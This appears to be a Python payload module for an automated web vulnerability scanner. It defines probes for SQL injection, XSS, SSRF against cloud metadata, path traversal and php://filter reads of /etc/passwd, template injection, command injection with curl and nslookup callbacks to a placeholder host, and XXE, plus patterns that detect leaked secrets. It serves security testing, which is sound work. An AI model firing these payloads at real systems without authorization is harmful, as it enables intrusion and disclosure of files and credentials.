"""Payload definitions for non-destructive vulnerability detection."""

import re
from typing import Optional

SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
]

# Delays are intentionally short to reduce target impact.
SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(3)-- ",
    "'; WAITFOR DELAY '0:0:3'--",
    "' || pg_sleep(3)--",
    "' OR 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('bbscan',3) ELSE 1 END FROM dual)--",
]

SQLI_TIME_DIFF_PAIRS = [
    {
        "name": "mysql_sleep",
        "true": "' OR IF(1=1,SLEEP(3),0)-- ",
        "false": "' OR IF(1=0,SLEEP(3),0)-- ",
    },
    {
        "name": "postgres_sleep",
        "true": "' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(3) END) IS NULL--",
        "false": "' OR (SELECT CASE WHEN 1=0 THEN pg_sleep(3) END) IS NULL--",
    },
    {
        "name": "oracle_dbms_pipe",
        "true": "' OR 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('bbscan',3) ELSE 1 END FROM dual)--",
        "false": "' OR 1=(SELECT CASE WHEN 1=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('bbscan',3) ELSE 1 END FROM dual)--",
    },
    {
        "name": "mssql_waitfor",
        "true": "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
        "false": "'; IF (1=0) WAITFOR DELAY '0:0:3'--",
    },
]

SQLI_PARAM_HINTS = {
    "id",
    "custordid",
    "orderid",
    "customerid",
    "custid",
    "accountid",
    "siteid",
    "recordid",
    "userid",
    "name",
    "q",
    "query",
    "search",
    "key",
    "code",
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]

SSRF_TEST_VALUES = [
    "http://127.0.0.1:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080",
]

SSRF_PARAM_HINTS = {
    "url",
    "uri",
    "link",
    "endpoint",
    "callback",
    "return",
    "next",
    "dest",
    "redirect",
    "image",
    "avatar",
    "host",
    "domain",
}

# Server-side fetch *failure* signatures. Unlike bare "localhost"/"127.0.0.1"
# (which appear on countless benign pages), these indicate the server itself
# attempted an outbound connection and surfaced the error — a weak but
# meaningful in-band SSRF signal. Still confidence "low"; OAST is the real proof.
SSRF_CONNECTION_ERROR_MARKERS = [
    "connection refused",
    "connection reset",
    "connection timed out",
    "connection aborted",
    "failed to connect",
    "could not connect",
    "couldn't connect to host",
    "no route to host",
    "network is unreachable",
    "name or service not known",
    "getaddrinfo failed",
    "name resolution failed",
    "connect: permission denied",
]

# Cloud instance-metadata content. If any of this reflects back after probing
# 169.254.169.254 / metadata.google.internal, the server fetched the metadata
# endpoint on our behalf — high-confidence SSRF, not a guess.
SSRF_METADATA_MARKERS = [
    "ami-id",
    "instance-id",
    "instance-action",
    "iam/security-credentials",
    "meta-data/",
    "public-keys/",
    "security-credentials",
    "computemetadata",
    "metadata.google.internal",
    "accessKeyId".lower(),
]


def match_ssrf_markers(text: str):
    """Return (kind, matched_marker) where kind is 'metadata' or 'connection'.

    'metadata' is a strong signal (server fetched a metadata service);
    'connection' is a weak signal (server attempted and reported a fetch error).
    Returns None if nothing matched.
    """
    low = text.lower()
    for marker in SSRF_METADATA_MARKERS:
        if marker in low:
            return "metadata", marker
    for marker in SSRF_CONNECTION_ERROR_MARKERS:
        if marker in low:
            return "connection", marker
    return None

# Parameter names commonly used to carry a post-action redirect target.
REDIRECT_PARAM_HINTS = {
    "url",
    "uri",
    "redirect",
    "redirect_uri",
    "redirect_url",
    "redirecturl",
    "return",
    "return_url",
    "returnurl",
    "returnto",
    "return_to",
    "next",
    "dest",
    "destination",
    "continue",
    "goto",
    "go",
    "target",
    "to",
    "out",
    "link",
    "forward",
    "callback",
    "checkout_url",
    "rurl",
    "u",
}

# Canary host used to prove an off-site redirect. Never actually visited by a
# victim — presence in a Location header / meta refresh is the vulnerability.
OPEN_REDIRECT_CANARY = "evil-redirect-probe.example"

LFI_PARAM_HINTS = {
    "file",
    "path",
    "filepath",
    "filename",
    "document",
    "folder",
    "template",
    "page",
    "include",
    "inc",
    "resource",
    "download",
    "url",
    "uri",
    "src",
}

LFI_FILE_SCHEME_PAYLOADS = [
    "file:///C:/Windows/win.ini",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "file:///etc/passwd",
]

LFI_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../../../../etc/passwd",
]

# PHP stream-wrapper payloads. Only used when PHP is fingerprinted on the
# target. php://filter with a base64 encoder returns the *base64-encoded*
# contents of a file/script, bypassing filters that block traversal or that
# would otherwise execute a PHP source file instead of disclosing it. The
# detector base64-decodes the response and applies the standard leaked-file
# signatures, so a hit is confirmed rather than guessed.
LFI_PHP_WRAPPER_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=C:/Windows/win.ini",
]

# Literal markers unique to leaked system files. Bare "localhost"/"127.0.0.1"
# were removed — they appear on countless normal pages. What survives here is
# content that only a real file dump produces.
LFI_RESPONSE_MARKERS = [
    "root:x:0:0:",                 # /etc/passwd first line
    "; for 16-bit app support",    # win.ini
    "[fonts]",                     # win.ini
    "[extensions]",                # win.ini
    "[mci extensions]",            # win.ini
]

# Structural signatures. The hosts-file regex requires the 127.0.0.1<->localhost
# *pairing on one line*, which a passing mention of "localhost" cannot satisfy;
# the passwd regex matches the account-line shape (name:x:uid:gid:).
LFI_RESPONSE_REGEXES = [
    re.compile(r"127\.0\.0\.1\s+localhost", re.IGNORECASE),
    re.compile(r"(?m)^[a-z_][a-z0-9_-]*:[x*!]?:\d+:\d+:[^:]*:", re.IGNORECASE),
]


def match_lfi(text: str) -> Optional[str]:
    """Return the leaked-file signature that matched (for evidence), or None."""
    low = text.lower()
    for marker in LFI_RESPONSE_MARKERS:
        if marker.lower() in low:
            return marker
    for rx in LFI_RESPONSE_REGEXES:
        m = rx.search(text)
        if m:
            return m.group(0)[:120]
    return None


# Base64 blobs long enough to plausibly be an encoded file (php://filter output).
_BASE64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


def match_lfi_encoded(text: str) -> Optional[str]:
    """Detect base64-encoded leaked-file content (e.g. php://filter output).

    Scans the response for base64 blobs, decodes each, and applies the standard
    leaked-file signatures to the decoded bytes. Returns the matched signature
    (for evidence) or None. This confirms php://filter source/file disclosure
    without false positives, because the *decoded* content must match a real
    system-file marker.
    """
    import base64
    import binascii

    for match in _BASE64_BLOB_RE.finditer(text):
        blob = match.group(0)
        # Base64 length must be a multiple of 4 once padded; trim to be safe.
        trimmed = blob[: len(blob) - (len(blob) % 4)] if len(blob) % 4 else blob
        if len(trimmed) < 40:
            continue
        try:
            decoded = base64.b64decode(trimmed, validate=True)
        except (binascii.Error, ValueError):
            continue
        try:
            text_decoded = decoded.decode("utf-8", errors="ignore")
        except Exception:
            continue
        sig = match_lfi(text_decoded)
        if sig:
            return sig
    return None

IDOR_PARAM_HINTS = {"id", "user_id", "account_id", "order_id", "profile_id"}

# DBMS error *signatures* — regexes that match characteristic error-message
# shapes, not bare product names. Matching "mysql"/"postgresql" as substrings
# fired on any page that merely mentioned the product (footers, docs, "Powered
# by MySQL"); these patterns require the actual error text a driver emits.
SQL_ERROR_REGEXES = [
    re.compile(pattern, re.IGNORECASE)
    for pattern in (
        # MySQL / MariaDB
        r"you have an error in your sql syntax",
        r"check the manual that corresponds to your (mysql|mariadb) server version",
        r"warning:\s*mysqli?_",
        r"valid mysql result",
        r"mysql_fetch_(array|assoc|row|object|field)",
        r"com\.mysql\.jdbc\.",
        r"\bmysqlexception\b",
        r"\bmariadb\b.{0,40}\b(syntax|error)\b",
        # PostgreSQL
        r"unterminated quoted string at or near",
        r"pg_(query|exec|prepare)\(\)",
        r"\bnpgsql\b",
        r"psqlexception",
        r"postgresql.{0,20}error",
        r"org\.postgresql\.util\.psqlexception",
        # Microsoft SQL Server / ODBC / OLE DB
        r"unclosed quotation mark after the character string",
        r"incorrect syntax near",
        r"microsoft ole db provider for sql server",
        r"\[(microsoft|odbc)[^\]]*sql server[^\]]*\]",
        r"odbc sql server driver",
        r"system\.data\.sqlclient\.sqlexception",
        # Oracle
        r"\bora-\d{4,5}",
        r"\bpls-\d{4,5}",
        r"quoted string not properly terminated",
        r"sql command not properly ended",
        r"oracle.{0,20}(driver|error).{0,40}(syntax|ora-)",
        # SQLite
        r"sqlite3?::\w",
        r"\bsqlite_error\b",
        r"unrecognized token:",
        r"system\.data\.sqlite\.sqliteexception",
        r"sqlite3\.operationalerror",
        # Generic JDBC/ODBC/ANSI
        r"sqlstate\[",
        r"\bjava\.sql\.sqlexception\b",
        r"dynamic sql error",
        r"syntax error or access violation",
    )
]


def match_sql_error(text: str) -> Optional[str]:
    """Return the first matched DBMS error signature (for evidence), or None."""
    for rx in SQL_ERROR_REGEXES:
        m = rx.search(text)
        if m:
            return m.group(0)[:160]
    return None

# ---------------------------------------------------------------------------
# Server-Side Template Injection (SSTI)
# ---------------------------------------------------------------------------
# Detection is arithmetic and engine-agnostic: the detector injects an
# expression that multiplies two random operands, wrapped in a random sentinel
# (e.g. ``Zk3f9a{{8675*309}}Zk3f9a``). A vulnerable engine renders the product
# (``Zk3f9a2680575Zk3f9a``); a page that merely reflects the payload keeps the
# literal expression, so searching for ``<sentinel><product><sentinel>`` yields
# a very low false-positive, high-confidence signal. Each template below is a
# ``str.format`` pattern with ``{s}`` (sentinel) and ``{e}`` (expression).
SSTI_EXPRESSION_TEMPLATES = [
    "{s}{{{{{e}}}}}{s}",    # {{expr}}   Jinja2, Twig, Nunjucks, Liquid
    "{s}${{{e}}}{s}",       # ${expr}    FreeMarker, JSP EL, Thymeleaf, Angular
    "{s}#{{{e}}}{s}",       # #{expr}    Ruby (slim/haml), Thymeleaf, JSF EL
    "{s}<%= {e} %>{s}",     # <%= expr %> ERB, EJS
    "{s}${{{{{e}}}}}{s}",   # ${{expr}}  polyglot ($ + double brace)
    "{s}*{{{e}}}{s}",       # *{expr}    Thymeleaf selection
]


# ---------------------------------------------------------------------------
# OS Command Injection
# ---------------------------------------------------------------------------
# Primary signal is time-based *differential* blind: a shell metacharacter
# breaks out of the original command and runs a sleep. The detector pairs a
# sleeping payload with an identical non-sleeping one so a uniformly slow
# endpoint cannot trip the check (mirrors the SQLi timing rigor). ``{sec}`` is
# the sleep duration and ``{win}`` the equivalent ping packet count for Windows.
CMDI_SLEEP_TEMPLATES = [
    ";sleep {sec}",
    "|sleep {sec}",
    "|| sleep {sec}",
    "&& sleep {sec}",
    "$(sleep {sec})",
    "`sleep {sec}`",
    "%0asleep {sec}",
    "\nsleep {sec}",
    "&ping -n {win} 127.0.0.1",
    "|ping -n {win} 127.0.0.1",
    "&& timeout /t {sec}",
]

# Out-of-band blind: trigger a DNS/HTTP callback to ``{host}``. Any interaction
# recorded by the collaborator confirms command execution even with no output.
CMDI_OAST_TEMPLATES = [
    ";nslookup {host}",
    "|nslookup {host}",
    "&nslookup {host}",
    "$(nslookup {host})",
    "`nslookup {host}`",
    ";curl http://{host}/",
    "|curl http://{host}/",
    "&curl http://{host}/",
    "&nslookup {host}&",
]


# ---------------------------------------------------------------------------
# XML External Entity (XXE)
# ---------------------------------------------------------------------------
XXE_CONTENT_TYPES = ("application/xml", "text/xml", "application/soap+xml")

# Files whose contents ``match_lfi`` recognizes when the parser resolves the
# external entity and echoes it back (in-band XXE / file disclosure).
XXE_TARGET_FILES = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

# In-band file read: ``{file}`` is one of XXE_TARGET_FILES.
XXE_INBAND_TEMPLATES = [
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bbscan [<!ENTITY xxe SYSTEM "{file}">]>'
    "<bbscan>&xxe;</bbscan>",
]

# Out-of-band: the parser fetches ``{host}`` (DNS/HTTP) when resolving the
# entity, confirming blind XXE even when nothing is reflected.
XXE_OOB_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bbscan [<!ENTITY xxe SYSTEM "http://{host}/xxe">]>'
    "<bbscan>&xxe;</bbscan>"
)

# Benign, well-formed XML used to establish a baseline response for the
# absence check before injecting entities.
XXE_BASELINE_BODY = '<?xml version="1.0" encoding="UTF-8"?><bbscan>scan</bbscan>'


SECRET_PATTERNS = {
    "aws_access_key": r"AKIA[0-9A-Z]{16}",
    "github_token": r"ghp_[A-Za-z0-9]{36}",
    "generic_api_key": r"(?i)(api[_-]?key|token|secret|password)\s*[:=]\s*['\"][A-Za-z0-9_\-\./+=]{16,}['\"]",
    "slack_token": r"xox[baprs]-[A-Za-z0-9\-]{10,48}",
    "private_key_header": r"-----BEGIN (?:RSA|EC|OPENSSH|DSA)? ?PRIVATE KEY-----",
}

ENDPOINT_PATTERN = r"https?://[A-Za-z0-9\.-]+(?::\d+)?(?:/[A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]*)?"
